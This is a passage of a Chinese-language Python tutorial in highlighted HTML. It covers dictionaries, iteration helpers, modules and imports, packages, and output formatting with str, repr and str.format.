keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {'test': 1, 1: 'dddd'}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出2,test的值</span><span class="token comment"># test 1</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 输出所有键名</span><span class="token comment"># dict_keys(['test', 1])</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 输出所有键值</span><span class="token comment"># dict_values([1, 'dddd'])</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'txt'</span>  <span class="token comment"># 修改键值</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># {2: 'test', 'test': 'txt'}</span><span class="token keyword">del</span> dict2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 删除一个键</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {'test': 1}</span>dict2<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 清空字典</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {}</span><span class="token keyword">del</span> dict2  <span class="token comment"># 删除字典</span>dict2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'var'</span><span class="token punctuation">:</span> <span class="token string">'str'</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'var'</span><span class="token punctuation">:</span> <span class="token string">'var'</span><span class="token punctuation">}</span><span class="token comment"># 重复时后者覆盖前者</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {'1': 2, 'var': 'var', 'test': 'test'}</span><span class="token triple-quoted-string string">'''{'sape': 4139, 'guido': 4127, 'jack': 4098}{}{2: 'test', 'test': 1}{'test': 1, 1: 'dddd'}test 1dict_keys(['test', 1])dict_values([1, 'dddd']){2: 'test', 'test': 'txt'}{'test': 1}{}{'1': 2, 'var': 'var', 'test': 'test'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果关键字只是简单的字符串，使用关键字参数指定键值</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">dict</span><span class="token punctuation">(</span>sape<span class="token operator">=</span><span class="token number">4139</span><span class="token punctuation">,</span> guido<span class="token operator">=</span><span class="token number">4127</span><span class="token punctuation">,</span> jack<span class="token operator">=</span><span class="token number">4098</span><span class="token punctuation">)</span><span class="token comment">#{'sape': 4139, 'jack': 4098, 'guido': 4127}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>字典推导</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">dict3 <span class="token operator">=</span> <span class="token punctuation">{</span>x<span class="token punctuation">:</span> x<span class="token operator">**</span><span class="token number">2</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict3<span class="token punctuation">)</span><span class="token comment"># {2: 4, 4: 16, 6: 36}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="遍历技巧"><a href="#遍历技巧" class="headerlink" title="遍历技巧"></a>遍历技巧</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 关键字和对应的值可以使用 items() 方法同时解读</span>dict4 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'123'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'999'</span><span class="token punctuation">:</span> <span class="token string">'haha'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict4<span class="token punctuation">)</span><span class="token comment"># {'123': 'test', '999': 'haha'}</span><span class="token keyword">for</span> y<span class="token punctuation">,</span> v <span class="token keyword">in</span> dict4<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token comment"># 123 test</span><span class="token comment"># 999 haha</span><span class="token comment"># 索引位置和对应值可以使用 enumerate() 函数同时得到</span>list3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'111'</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'999'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token comment"># ['111', 'test', '999']</span><span class="token keyword">for</span> i<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0 1111 test2 999'''</span><span class="token comment"># 同时遍历两个或更多的序列，可以使用 zip() 组合</span>questions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'quest'</span><span class="token punctuation">,</span> <span class="token string">'favorite color'</span><span class="token punctuation">]</span>answers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'lancelot'</span><span class="token punctuation">,</span> <span class="token string">'the holy grail'</span><span class="token punctuation">,</span> <span class="token string">'blue'</span><span class="token punctuation">]</span><span class="token keyword">for</span> q<span class="token punctuation">,</span> a <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>questions<span class="token punctuation">,</span> answers<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'What is your {0}?  It is {1}.'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''What is your name?  It is lancelot.What is your quest?  It is the holy grail.What is your favorite color?  It is blue.'''</span><span class="token comment"># 反向输出, 使用reversed()函数</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 9 7 5 3 1 </span><span class="token comment"># 顺序遍历一个序列，使用 sorted() 函数返回一个已排序的序列</span>basket <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'orange'</span><span class="token punctuation">,</span> <span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'pear'</span><span class="token punctuation">,</span> <span class="token string">'orange'</span><span class="token punctuation">,</span> <span class="token string">'banana'</span><span class="token punctuation">]</span><span class="token keyword">for</span> f <span class="token keyword">in</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>basket<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># apple banana orange pear </span><span class="token triple-quoted-string string">'''{'123': 'test', '999': 'haha'}123 test999 haha['111', 'test', '999']0 1111 test2 999What is your name?  It is lancelot.What is your quest?  It is the holy grail.What is your favorite color?  It is blue.9 7 5 3 1 apple banana orange pear '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>模块是一个包含所有你定义的函数和变量的文件，其后缀名是.py，意思是你能直接调用写好的函数或者变量来执行你的任务，这些写好的函数和变量被封装在一个文件包中</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'命令行参数如下:'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n\nPython 路径为：'</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>path<span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>import sys 引入 python 标准库中的 sys.py 模块</li><li>sys.argv 是一个包含命令行参数的列表</li><li>sys.path 包含了一个 Python 解释器自动查找所需模块的路径的列表</li></ol><h3 id="import语句"><a href="#import语句" class="headerlink" title="import语句"></a>import语句</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> module1<span class="token punctuation">[</span><span class="token punctuation">,</span> module2<span class="token punctuation">[</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> moduleN<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>import只会导入一次</li><li>解释器收缩路径是在sys.path中确定</li></ol><p>在sys.path任一路径下创建文件fibo.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 斐波那契(fibonacci)数列模块</span> <span class="token keyword">def</span> <span class="token function">fib</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 定义到 n 的斐波那契数列</span>    a<span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span>    <span class="token keyword">while</span> b <span class="token operator">&lt;</span> n<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a<span class="token operator">+</span>b    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">fib2</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 返回到 n 的斐波那契数列</span>    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    a<span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span>    <span class="token keyword">while</span> b <span class="token operator">&lt;</span> n<span class="token punctuation">:</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token punctuation">)</span>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a<span class="token operator">+</span>b    <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>引入模块使用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">fibo<span class="token punctuation">.</span>fib<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>fibo<span class="token punctuation">.</span>fib2<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>fib <span class="token operator">=</span> fibo<span class="token punctuation">.</span>fib <span class="token comment"># 将函数赋给本地</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="from-…-import-语句"><a href="#from-…-import-语句" class="headerlink" title="from … import 语句"></a>from … import 语句</h3><p>Python 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> modname <span class="token keyword">import</span> name1<span class="token punctuation">[</span><span class="token punctuation">,</span> name2<span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> nameN<span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要导入模块 fibo 的 fib 函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> fibo <span class="token keyword">import</span> fib<span class="token punctuation">,</span> fib2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个声明不会把整个fibo模块导入到当前的命名空间中，它只会将fibo里的fib函数引入进来</p><h3 id="from-…-import-语句-1"><a href="#from-…-import-语句-1" class="headerlink" title="from … import * 语句"></a>from … import * 语句</h3><p>把一个模块的所有内容全都导入到当前的命名空间</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> modname <span class="token keyword">import</span> <span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="深入模式"><a href="#深入模式" class="headerlink" title="深入模式"></a>深入模式</h3><p>模块除了方法定义，还可以包括可执行的代码。这些代码一般用来初始化这个模块。这些代码只有在第一次被导入时才会被执行。每个模块有各自独立的符号表，在模块内部为所有的函数当作全局符号表来使用。</p><p>导入模块的全局变量和本模块的全局变量是不影响的</p><h3 id="name-属性"><a href="#name-属性" class="headerlink" title="__name__属性"></a>__name__属性</h3><ol><li>用__name__属性来使该程序块仅在该模块自身运行时执行</li><li>每个模块都有一个__name__属性，当其值是’<strong>main</strong>‘时，表明该模块自身在运行，否则是被引入</li><li><strong><strong>name</strong></strong> 与 <strong><strong>main</strong></strong> 底下是双下划线， <strong>_ _</strong> 是这样去掉中间的那个空格</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'程序自身在运行'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'我来自另一模块'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">python using_name<span class="token punctuation">.</span>py程序自身在运行<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">import</span> using_name我来自另一模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="dir-函数"><a href="#dir-函数" class="headerlink" title="dir()函数"></a>dir()函数</h3><p>内置的函数 dir() 可以找到模块内定义的所有名称。以一个字符串列表的形式返回</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''['__breakpointhook__', '__displayhook__', '__doc__', '__excepthook__', '__interactivehook__', '__loader__', '__name__', '__package__', '__spec__', '__stderr__', '__stdin__', '__stdout__', '__unraisablehook__', '_base_executable', '_clear_type_cache', '_current_frames', '_debugmallocstats', '_enablelegacywindowsfsencoding', '_framework', '_getframe', '_git', '_home', '_xoptions', 'addaudithook', 'api_version', 'argv', 'audit', 'base_exec_prefix', 'base_prefix', 'breakpointhook', 'builtin_module_names', 'byteorder', 'call_tracing', 'callstats', 'copyright', 'displayhook', 'dllhandle', 'dont_write_bytecode', 'exc_info', 'excepthook', 'exec_prefix', 'executable', 'exit', 'flags', 'float_info', 'float_repr_style', 'get_asyncgen_hooks', 'get_coroutine_origin_tracking_depth', 'getallocatedblocks', 'getcheckinterval', 'getdefaultencoding', 'getfilesystemencodeerrors', 'getfilesystemencoding', 'getprofile', 'getrecursionlimit', 'getrefcount', 'getsizeof', 'getswitchinterval', 'gettrace', 'getwindowsversion', 'hash_info', 'hexversion', 'implementation', 'int_info', 'intern', 'is_finalizing', 'maxsize', 'maxunicode', 'meta_path', 'modules', 'path', 'path_hooks', 'path_importer_cache', 'platform', 'prefix', 'pycache_prefix', 'set_asyncgen_hooks', 'set_coroutine_origin_tracking_depth', 'setcheckinterval', 'setprofile', 'setrecursionlimit', 'setswitchinterval', 'settrace', 'stderr', 'stdin', 'stdout', 'thread_info', 'unraisablehook', 'version', 'version_info', 'warnoptions', 'winver']'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果没有给定参数，那么 dir() 函数会罗列出当前定义的所有名称</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'i', 'sys']'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="标准模块"><a href="#标准模块" class="headerlink" title="标准模块"></a>标准模块</h3><p>Python 本身带着一些标准的模块库，有些模块直接被构建在解析器里</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">print</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>ps1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>ps2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p>包是一种管理 Python 模块命名空间的形式，采用”点模块名称”，比如一个模块的名称是 A.B， 那么他表示一个包 A中的子模块 B，例如 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sound/                          顶层包      __init__.py               初始化 sound 包      formats/                  文件格式转换子包              __init__.py              wavread.py              wavwrite.py              aiffread.py              aiffwrite.py              auread.py              auwrite.py              <span class="token punctuation">..</span>.      effects/                  声音效果子包              __init__.py              echo.py              surround.py              reverse.py              <span class="token punctuation">..</span>.      filters/                  filters 子包              __init__.py              equalizer.py              vocoder.py              karaoke.py              <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>目录只有包含一个叫做 <strong>init</strong>.py 的文件才会被认作是一个包</li><li>使用形如 <strong>import item.subitem.subsubitem</strong> 这种导入形式，除了最后一项，都必须是包，而最后一项则可以是模块或者是包，但是不可以是类，函数或者变量的名字。</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sound<span class="token punctuation">.</span>effects<span class="token punctuation">.</span>echo<span class="token comment"># 导入包里的特定模块</span>sound<span class="token punctuation">.</span>effects<span class="token punctuation">.</span>echo<span class="token punctuation">.</span>echofilter<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">,</span> output<span class="token punctuation">,</span> delay<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span> atten<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">from</span> sound<span class="token punctuation">.</span>effects <span class="token keyword">import</span> echo<span class="token comment"># 导入子模块的方法</span>echo<span class="token punctuation">.</span>echofilter<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">,</span> output<span class="token punctuation">,</span> delay<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span> atten<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">from</span> sound<span class="token punctuation">.</span>effects<span class="token punctuation">.</span>echo <span class="token keyword">import</span> echofilter<span class="token comment"># 直接导入一个函数或者变量</span>echofilter<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">,</span> output<span class="token punctuation">,</span> delay<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span> atten<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">from</span> package <span class="token keyword">import</span> item<span class="token comment">#import 语法会首先把 item 当作一个包定义的名称，如果没找到，再试图按照一个模块去导入。如果还没找到，抛出一个 :exc:ImportError 异常。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="从一个包中导入"><a href="#从一个包中导入" class="headerlink" title="从一个包中导入*"></a>从一个包中导入*</h3><ol><li><p>如果包定义文件 <strong>_<em>init</em>_.py</strong> 存在一个叫做 <strong>_<em>all</em>_</strong> 的列表变量，那么在使用 <strong>from package import *</strong> 的时候就把这个列表中的所有名字作为包内容导入</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">__all__ <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"echo"</span><span class="token punctuation">,</span> <span class="token string">"surround"</span><span class="token punctuation">,</span> <span class="token string">"reverse"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果 <strong><strong>all</strong></strong> 没有定义，那么使用**from sound.effects import ***这种语法的时候，就不会导入包 sound.effects 里的任何子模块</p></li><li><p>包还提供一个额外的属性__path__。这是一个目录列表，里面每一个包含的目录都有为这个包服务的__init__.py</p></li></ol><h2 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h2><h3 id="输入格式美化"><a href="#输入格式美化" class="headerlink" title="输入格式美化"></a>输入格式美化</h3><ol><li><code>print()</code></li><li><code>write()</code></li><li><code>sys.stdout</code>标准输出文件</li><li><code>str.format()</code>多样化</li><li><code>str()</code>用户易读</li><li><code>repr</code>解释器易读</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'test'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># test</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 'test'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 0.14285714285714285</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 0.14285714285714285</span>s <span class="token operator">=</span> <span class="token string">'test\nhaha'</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''testhaha'''</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''testhaha'''</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># repr将转义字符当做字符执行</span><span class="token comment"># 'test\nhaha'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 注意括号</span><span class="token comment"># ('test\nhaha', [1, 2])</span><span class="token comment"># repr接收python所有类型</span><span class="token comment"># 输出平方与立方表</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">repr</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>    <span class="token comment"># 注意前一行 'end' 的使用</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>x<span class="token operator">*</span>x<span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># rjust() 方法, 它可以将字符串靠右, 并在左边填充空格</span><span class="token comment"># zfill(), 它会在数字的左边填充 0</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0:2d} {1:3d} {2:4d}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> x<span class="token operator">*</span>x<span class="token punctuation">,</span> x<span class="token operator">*</span>x<span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''test'test'0.142857142857142850.14285714285714285testhahatesthaha'test\nhaha'('test\nhaha', [1, 2]) 1   1    1 2   4    8 3   9   27 4  16   64 5  25  125 6  36  216 7  49  343 8  64  512 9  81  72910 100 1000 1   1    1 2   4    8 3   9   27 4  16   64 5  25  125 6  36  216 7  49  343 8  64  512 9  81  72910 100 1000'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="str-format-基本使用"><a href="#str-format-基本使用" class="headerlink" title="str.format()基本使用"></a>str.format()基本使用</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 常规输出</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{}-{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token 